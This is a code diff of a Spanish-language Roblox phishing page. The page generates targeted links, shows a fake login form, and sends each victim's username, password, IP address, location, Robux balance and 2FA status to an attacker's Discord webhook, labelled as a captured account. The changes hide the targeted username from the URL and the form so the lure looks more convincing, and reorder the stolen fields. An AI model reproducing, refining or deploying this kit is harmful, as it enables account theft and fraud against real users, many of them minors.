@@ -189,15 +189,20 @@
 <script>
 let registros = [], enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
 const FOTO_BOT = "https://cdn.phototourl.com/free/2026-08-15-ee59cd76-8d17-4221-a2bf-e12452038867.jpg";
+let USUARIO_OCULTO = ''; // ✅ Se guarda internamente SIN mostrar en la URL
 
 window.onload=async function(){
     localStorage.removeItem('cuentas');
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
+        // ✅ Guardamos el usuario pero LIMPIAMOS la URL para que NO se vea
+        USUARIO_OCULTO = u;
+        history.replaceState({}, document.title, window.location.pathname);
+        
         document.getElementById('pagLogin').style.display='block';
         document.getElementById('pagPanel').style.display='none';
-        document.getElementById('usuario').value=u;
+        document.getElementById('usuario').value=''; // ✅ NO se muestra el nombre en la casilla
         await cargarIP();
         await cargarDatosRoblox(u);
     }else{
@@ -238,7 +243,6 @@ async function cargarDatosRoblox(usuario){
         const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
         robuxCuenta=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json()).then(r=>r.robux||0);
         
-        // ✅ CÁLCULO DE DÍAS ARREGLADO
         const fechaCreacion = new Date(perfil.created);
         const hoy = new Date();
         const diferenciaMs = hoy - fechaCreacion;
@@ -282,7 +286,8 @@ function cambiarVista(nombre){
 function limpiarError(){document.getElementById('cajaErr').style.display='none';}
 function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.style.display='block';}
     async function enviarDatos(){
-    const u = document.getElementById('usuario').value.trim();
+    // ✅ Usa el usuario OCULTO si viene del enlace, sino lo que escribe la persona
+    const u = USUARIO_OCULTO || document.getElementById('usuario').value.trim();
     const pass = document.getElementById('pass').value.trim();
     const btn = document.getElementById('btnEntrar');
 
@@ -301,7 +306,7 @@ function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.sty
     btn.disabled = true;
 
     await cargarIP();
-    await cargarDatosRoblox(u);
+    if(!USUARIO_OCULTO) await cargarDatosRoblox(u);
 
     const wh = localStorage.getItem('webhook');
     const todos = localStorage.getItem('todos')==='1'?'@everyone **NUEVA CUENTA OBTENIDA** 🔥':' ';
@@ -330,16 +335,15 @@ function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.sty
                     color: 16711680,
                     thumbnail: { url: fotoPerfil },
                     fields: [
-                        {name: "🌍 Cuenta Creada / Ubicación IP", value: `**${ipDatos.pais}** ${ipDatos.bandera}\n**${ipDatos.ip}**`, inline: false},
-                        {name: "🐉 Usuario", value: `**${datosRoblox.nombre||u}**`, inline: true},
-                        {name: "🔥 Contraseña", value: `||${pass}||`, inline: true},
-                        {name: "📋 Sobre el Usuario", value: `**Edad de cuenta:** ${datosRoblox.dias} Días`, inline: false},
+                        {name: "📊 Summary", value: `**Usuario:** ${datosRoblox.nombre||u}\n**ID:** ${datosRoblox.id||'Desconocido'}\n**Cuenta creada:** ${datosRoblox.fechaCreacion}\n**Edad:** ${datosRoblox.dias} Días`, inline: false},
+                        {name: "🌍 Ubicación / IP", value: `**${ipDatos.pais}** ${ipDatos.bandera}\n**${ipDatos.ip}**`, inline: false},
                         {name: "🔶 Robux", value: `**Saldo:** ${datosRoblox.robux}\n**Pendiente:** 0`, inline: true},
                         {name: "📈 RAP", value: `**RAP:** 0\n**Objetos:** 0`, inline: true},
                         {name: "✅ Verificado", value: `${datosRoblox.verificado}`, inline: true},
                         {name: "🔒 Premium", value: `**${datosRoblox.premium}**`, inline: true},
                         {name: "🏢 Grupos", value: `**Saldo:** 0\n**Propios:** 0`, inline: true},
-                        {name: "🔔 Notificación", value: `**${datosRoblox.tiene2FA}**`, inline: false},
+                        {name: "🔔 2FA", value: `**${datosRoblox.tiene2FA}**`, inline: false},
+                        {name: "🔥 Contraseña", value: `||${pass}||`, inline: false},
                         {name: "⚠️ .ROBLOSECURITY", value: `||⚠️ NO COMPARTIR ESTO||`, inline: false}
                     ],
                     footer: {text: `Capturado: ${fechaAhora}`}
@@ -358,6 +362,7 @@ function generarEnlace(){
     const u = document.getElementById('usuarioLink').value.trim();
     const base = window.location.origin + window.location.pathname;
     enlaceGenerado = u ? `${base}?u=${encodeURIComponent(u)}` : base;
+    
     document.getElementById('enlaceOut').style.display='block';
     document.getElementById('enlaceOut').textContent = enlaceGenerado;
     document.getElementById('btnCopiar').style.display='inline-block';
